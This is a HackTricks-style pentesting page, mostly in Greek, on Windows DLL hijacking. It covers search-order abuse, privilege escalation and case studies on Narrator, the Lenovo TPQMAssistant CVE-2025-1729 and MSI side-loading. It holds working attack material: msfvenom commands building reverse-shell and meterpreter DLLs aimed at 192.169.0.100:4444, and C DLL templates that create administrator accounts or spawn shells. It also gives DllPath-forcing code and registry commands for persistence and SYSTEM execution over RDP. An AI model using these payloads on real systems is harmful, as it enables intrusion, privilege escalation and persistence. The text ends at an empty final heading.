# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking αφορά τη χειραγώγηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει κακόβουλο DLL. Ο όρος περιλαμβάνει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρά την εστίαση στην escalation εδώ, η μέθοδος hijacking παραμένει ίδια μεταξύ των στόχων.

### Συνηθισμένες Τεχνικές

Διάφορες μέθοδοι χρησιμοποιούνται για DLL hijacking, και η αποτελεσματικότητά τους εξαρτάται από τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης που προηγείται της νόμιμης, εκμεταλλευόμενοι το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία κακόβουλου DLL που η εφαρμογή θα προσπαθήσει να φορτώσει, πιστεύοντας ότι είναι ένα απαιτούμενο αλλά μη υπαρκτό DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το `%PATH%` ή αρχεία `.exe.manifest` / `.exe.local` για να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με κακόβουλο αντίγραφο στον κατάλογο WinSxS, μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε φάκελο υπό έλεγχο του χρήστη μαζί με την αντιγραμμένη εφαρμογή, παρόμοιο με τις τεχνικές Binary Proxy Execution.

> [!TIP]
> Για μια βήμα-προς-βήμα αλυσίδα που στρώνει HTML staging, AES-CTR configs, και .NET implants πάνω από DLL sideloading, δείτε την παρακάτω ροή εργασίας.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εύρεση ελλειπόντων DLLs

Ο πιο συνηθισμένος τρόπος να βρείτε ελλείποντα DLLs σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, ρυθμίζοντας τα ακόλουθα 2 φίλτρα:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και εμφανίζοντας μόνο την **File System Activity**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **missing dlls γενικά**, αφήστε αυτό να τρέξει για μερικά δευτερόλεπτα.\
Αν ψάχνετε για ένα **missing dll μέσα σε ένα συγκεκριμένο εκτελέσιμο**, ορίστε ένα **επιπλέον φίλτρο όπως "Process Name" "contains" `<exec name>`, εκτελέστε το εκτελέσιμο, και σταματήστε την καταγραφή συμβάντων**.

## Εκμετάλλευση ελλειπόντων DLLs

Για να κάνουμε privilege escalation, η καλύτερη ευκαιρία είναι να μπορέσουμε να γράψουμε ένα DLL που μια διεργασία με προνόμια θα προσπαθήσει να φορτώσει σε κάποιο από τα μέρη όπου θα αναζητηθεί. Έτσι, μπορούμε είτε να γράψουμε ένα DLL σε ένα φάκελο όπου το DLL αναζητείται πριν από τον φάκελο που περιέχει το πρωτότυπο DLL (σπάνια περίπτωση), είτε να γράψουμε σε κάποιο φάκελο όπου το DLL θα αναζητηθεί και το αρχικό DLL να μην υπάρχει σε κανέναν φάκελο.

### Dll Search Order

**Μέσα στην** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται συγκεκριμένα τα DLLs.**

Οι εφαρμογές Windows αναζητούν DLLs ακολουθώντας ένα σύνολο προ-ορισμένων διαδρομών αναζήτησης, σε μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα κακόβουλο DLL τοποθετείται στρατηγικά σε μία από αυτές τις διαδρομές, ώστε να φορτωθεί πριν από το αυθεντικό DLL. Μια λύση για να το αποτρέψετε είναι να διασφαλίσετε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα DLLs που χρειάζεται.

Παρακάτω φαίνεται η σειρά αναζήτησης DLL σε 32-bit συστήματα:

1. Ο κατάλογος από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο system directory. Χρησιμοποιήστε τη [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function για να λάβετε τη διαδρομή αυτού του καταλόγου. (_C:\Windows\System32_)
3. Ο 16-bit system directory. Δεν υπάρχει συνάρτηση που να επιστρέφει τη διαδρομή αυτού του καταλόγου, αλλά ψάχνεται. (_C:\Windows\System_)
4. Ο Windows directory. Χρησιμοποιήστε τη [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function για να λάβετε τη διαδρομή αυτού του καταλόγου. (_C:\Windows_)
5. Ο τρέχων κατάλογος.
6. Οι κατάλογοι που αναφέρονται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι αυτό δεν περιλαμβάνει την ανά-εφαρμογή διαδρομή που ορίζεται από το κλειδί μητρώου **App Paths**. Το κλειδί **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό του DLL search path.

Αυτή είναι η default σειρά αναζήτησης με το **SafeDllSearchMode** ενεργοποιημένο. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτό το χαρακτηριστικό, δημιουργήστε την τιμή μητρώου HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode και ορίστε την σε 0 (η προεπιλογή είναι enabled).

Εάν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά στον κατάλογο του εκτελέσιμου module που φορτώνει το LoadLibraryEx.

Τέλος, σημειώστε ότι ένα dll μπορεί να φορτωθεί δηλώνοντας την απόλυτη διαδρομή αντί μόνο το όνομα. Στην περίπτωση αυτή, το dll θα αναζητηθεί μόνο σε αυτή τη διαδρομή (αν το dll έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως όταν φορτώνονται απλώς με όνομα).

Υπάρχουν και άλλοι τρόποι για να αλλάξει η σειρά αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προχωρημένος τρόπος για να επηρεάσετε καθοριστικά τη διαδρομή αναζήτησης DLL μιας νεοδημιουργούμενης διεργασίας είναι να ορίσετε το πεδίο DllPath στα RTL_USER_PROCESS_PARAMETERS όταν δημιουργείτε τη διεργασία με τις native APIs του ntdll. Προσφέροντας έναν κατάλογο υπό έλεγχο του επιτιθέμενου εδώ, μια στοχευόμενη διεργασία που επιλύει ένα εισαγόμενο DLL με το όνομα (χωρίς απόλυτη διαδρομή και χωρίς χρήση των safe loading flags) μπορεί να αναγκαστεί να φορτώσει κακόβουλο DLL από εκείνον τον κατάλογο.

Κύρια ιδέα
- Σχηματίστε τα process parameters με RtlCreateProcessParametersEx και παρέχετε ένα custom DllPath που δείχνει στον φάκελο που ελέγχετε (π.χ. ο κατάλογος όπου βρίσκεται ο dropper/unpacker).
- Δημιουργήστε τη διεργασία με RtlCreateUserProcess. Όταν το target binary επιλύσει ένα DLL με όνομα, ο loader θα συμβουλεύεται το παρεχόμενο DllPath κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμα και όταν το κακόβουλο DLL δεν είναι colocated με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη νέα child process που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διεργασία.
- Ο στόχος πρέπει να εισάγει ή να καλεί LoadLibrary για ένα DLL με όνομα (χωρίς απόλυτη διαδρομή και χωρίς χρήση LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs και hardcoded absolute paths δεν μπορούν να hijackαριστούν. Forwarded exports και SxS μπορεί να αλλάξουν την προτεραιότητα.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα λειτουργικής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (εξάγοντας τις απαιτούμενες συναρτήσεις ή προωθώντας (proxy) στην πραγματική) στον DllPath κατάλογό σας.
- Εκτελέστε ένα signed binary γνωστό ότι ψάχνει το xmllite.dll με το παραπάνω τεχνικό μοτίβο. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί σε πραγματικό περιβάλλον να οδηγεί multi-stage sideloading chains: ένας αρχικός launcher αφήνει ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα Microsoft-signed, hijackable binary με custom DllPath για να αναγκάσει τη φόρτωση του attacker’s DLL από έναν staging directory.


#### Εξαιρέσεις στην σειρά αναζήτησης DLL από την τεκμηρίωση των Windows

Ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL σημειώνονται στην τεκμηρίωση των Windows:

- Όταν μια **DLL που μοιράζεται το όνομά της με μια ήδη φορτωμένη στη μνήμη** συναντιέται, το σύστημα παρακάμπτει την συνηθισμένη αναζήτηση. Αντί γι' αυτό, εκτελεί έλεγχο για redirection και manifest πριν προχωρήσει στην DLL που ήδη βρίσκεται στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για την DLL**.
- Σε περιπτώσεις όπου η DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει τη δική του έκδοση της known DLL, μαζί με οποιεσδήποτε εξαρτώμενες DLLs, **παραλείποντας τη διαδικασία αναζήτησης**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα αυτών των known DLLs.
- Εάν μια **DLL έχει dependencies**, η αναζήτηση για αυτές τις εξαρτώμενες DLLs διεξάγεται σαν να είχαν υποδειχθεί μόνο με τα **module names**, ανεξαρτήτως του αν η αρχική DLL είχε εντοπιστεί μέσω πλήρους διαδρομής.

### Κλιμάκωση προνομίων

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει υπό **διαφορετικά προνόμια** (horizontal or lateral movement), η οποία **λείπει από DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** σε οποιονδήποτε **κατάλογο** στον οποίο θα **αναζητηθεί** η **DLL**. Αυτή η θέση μπορεί να είναι ο κατάλογος του εκτελέσιμου ή ένας κατάλογος μέσα στο system path.

Ναι, οι προϋποθέσεις είναι περίπλοκες για να βρεθούν καθώς **από προεπιλογή είναι κάπως σπάνιο να βρεις ένα privileged executable που του λείπει ένα dll** και είναι ακόμη **πιο περίεργο να έχεις write permissions σε ένα φάκελο του system path** (συνήθως δεν μπορείς από προεπιλογή). Αλλά, σε κακώς ρυθμισμένα περιβάλλοντα αυτό είναι δυνατό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις απαιτήσεις, μπορείτε να ελέγξετε το project [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν **κύριος στόχος του έργου είναι να παρακάμψει το UAC**, μπορεί να βρείτε εκεί ένα **PoC** ενός Dll hijaking για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανότατα αλλάζοντας απλώς τη διαδρομή του φακέλου όπου έχετε δικαιώματα εγγραφής).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να εκμεταλλευτείτε το Dll Hijacking για να κλιμακώσετε τα προνόμια όταν έχετε δικαιώματα εγγραφής σε έναν **System Path folder** δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για να εντοπίσετε αυτήν την ευπάθεια είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Example

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε μια dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτή**. Παρ' όλα αυτά, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα του **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη για dll hijacking με σκοπό την εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **templates** ή για να δημιουργήσετε ένα **dll με μη απαραίτητες συναρτήσεις που εξάγονται**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Βασικά, ένας **Dll proxy** είναι ένα DLL ικανό να **εκτελέσει τον κακόβουλο κώδικά σας όταν φορτωθεί**, αλλά και να **προβάλλει** και να **λειτουργεί** όπως αναμένεται, ανακατευθύνοντας όλες τις κλήσεις στην πραγματική βιβλιοθήκη.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε ουσιαστικά να **ορίσετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **δημιουργήσετε ένα proxified dll** ή να **ορίσετε το Dll** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Λάβετε έναν meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86, δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σας

Σημειώστε ότι σε αρκετές περιπτώσεις το Dll που θα μεταγλωττίσετε πρέπει να **export several functions** που πρόκειται να φορτωθούν από τη victim process. Εάν αυτές οι functions δεν υπάρχουν, το **binary won't be able to load** αυτές και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί να ελέγχει κατά την εκκίνηση μια προβλέψιμη, ανά γλώσσα DLL τοπικοποίησης που μπορεί να γίνει hijacked για arbitrary code execution και persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC σιωπή
- Ένα αφελές hijack θα μιλήσει/επισκιάσει το UI. Για να μείνετε σιωπηλοί, κατά το attach αναζητήστε τα νήματα του Narrator, ανοίξτε το κύριο νήμα (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάντε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας νήμα. Δείτε το PoC για πλήρη κώδικα.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το τοποθετημένο DLL. Στην secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσει ο Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε με RDP στον host, στην οθόνη σύνδεσης πατήστε CTRL+WIN+ENTER για να εκκινήσει ο Narrator· το DLL σας εκτελείται ως SYSTEM στην secure desktop.
- Η εκτέλεση σταματά όταν η RDP συνεδρία κλείσει — κάντε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη καταχώρηση Accessibility Tool (AT) στο μητρώο (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισαγάγετε και στη συνέχεια να ορίσετε το `configuration` στο όνομα εκείνου του AT. Αυτό παρέχει proxy για αυθαίρετη εκτέλεση μέσω του Accessibility framework.

Notes
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα admin.
- Όλη η λογική του payload μπορεί να ζει στο `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτή η περίπτωση επιδεικνύει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), καταγεγραμμένο ως **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Ένας επιτιθέμενος μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο, εκμεταλλευόμενος το λείπον DLL για να αποκτήσει εκτέλεση κώδικα υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή Επίθεσης

1. Ως κανονικός χρήστης, τοποθετήστε `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Σε περίπτωση που ένας administrator είναι συνδεδεμένος όταν εκτελεστεί η εργασία, το κακόβουλο DLL τρέχει στην περίοδο σύνδεσης του administrator με medium integrity.
4. Χρησιμοποιήστε standard UAC bypass techniques για να ανεβάσετε τα προνόμια από medium integrity σε SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Οι threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads κάτω από μια trusted, signed process.

Σύνοψη αλυσίδας
- Ο χρήστης κατεβάζει το MSI. Μια CustomAction τρέχει αθόρυβα κατά την GUI εγκατάσταση (π.χ., LaunchApplication ή μια VBScript action), ανασυνθέτοντας το επόμενο στάδιο από embedded resources.
- Ο dropper εγγράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο φάκελο (παράδειγμα ζεύγος: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν το υπογεγραμμένο EXE ξεκινήσει, η Windows DLL search order φορτώνει το wsc.dll από τον working directory πρώτο, εκτελώντας attacker code υπό ένα signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Ψάξτε για εγγραφές που τρέχουν executables ή VBScript. Παράδειγμα ύποπτου pattern: LaunchApplication που εκτελεί ένα embedded file στο background.
- Στο Orca (Microsoft Orca.exe), εξετάστε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Ψάξτε για πολλαπλά μικρά τεμάχια που συγχωνεύονται και αποκρυπτογραφούνται από μια VBScript CustomAction. Συνηθισμένη ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Αποθέστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος υπογεγραμμένος host (Avast). Η διαδικασία προσπαθεί να φορτώσει wsc.dll με το όνομα από το φάκελό της.
- wsc.dll: attacker DLL. Εάν δεν απαιτούνται συγκεκριμένα exports, το DllMain μπορεί να αρκεί; διαφορετικά, κατασκευάστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη ενώ εκτελείτε το payload στο DllMain.
- Κατασκευάστε ένα ελάχιστο DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για τις απαιτήσεις των exports, χρησιμοποιήστε ένα proxying framework (π.χ., DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που επίσης εκτελεί το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί απόλυτες διαδρομές ή flags ασφαλούς φόρτωσης (π.χ., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Οι KnownDLLs, SxS και τα forwarded exports μπορεί να επηρεάσουν την προτεραιότητα και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του export set.

## Υπογεγραμμένες τριάδες + κρυπτογραφημένα payloads (μελέτη περίπτωσης ShadowPad)

